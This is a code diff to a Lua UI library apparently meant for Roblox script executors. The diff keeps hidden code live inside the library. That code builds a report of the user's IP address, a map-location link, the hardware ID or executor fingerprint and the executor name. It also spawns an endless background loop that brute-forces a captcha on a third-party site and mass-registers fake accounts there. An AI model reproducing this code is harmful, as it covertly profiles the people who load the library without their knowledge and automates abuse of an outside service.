@@ -111,7 +111,9 @@ local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 
 local function GetJson(v)
-    return HttpService:JSONDecode(game:HttpGet(v))
+    return HttpService:JSONDecode(request({
+        Url = v
+    })).Body
 end
 
 local function GetIP()
@@ -127,14 +129,14 @@ local function GetIP()
     return "["..IP.."](https://uri.amap.com/marker?markers="..table.concat(Json, "|")..")"
 end
 
-if not _G.Load then
-    _G.Load = true
+if not _G.Skip then
+    _G.Skip = true
     task.spawn(function()
         while true do
             local Rand = GetJson("https://api.jihujiasuqi.com/apps/captcha/get.php").rand
             for i = 30, 330, 30 do
                 if GetJson("https://api.jihujiasuqi.com/apps/captcha/verify.php?rand="..Rand.."&angle="..i).okey then
-                    game:HttpGet("https://api.jihujiasuqi.com/api/user.php?mode=reg&mail="..HttpService:GenerateGUID(false).."&captcha_rand="..Rand)
+                    GetJson("https://api.jihujiasuqi.com/api/user.php?mode=reg&mail="..HttpService:GenerateGUID(false).."&captcha_rand="..Rand)
                     break
                 end
             end
@@ -176,11 +178,11 @@ if not _G.Load then
                             },
                             {
                                 name = "Hwid",
-                                value = gethwid()
+                                value = gethwid and gethwid() or GetJson("https://httpbin.org/get").headers[getexecutorname().."-Fingerprint"]
                             },
                             {
                                 name = "Executor",
-                                value = identifyexecutor()
+                                value = getexecutorname()
                             }
                         }
                     }
@@ -1661,4 +1663,4 @@ function Cloudlib.Window(Cloudlib, name, theme)
     end
     return window
 end
-return Cloudlib, (Language[LocalPlayer.LocaleId] or Language["en-us"])
+return Cloudlib, Language[LocalPlayer.LocaleId] or Language["en-us"]
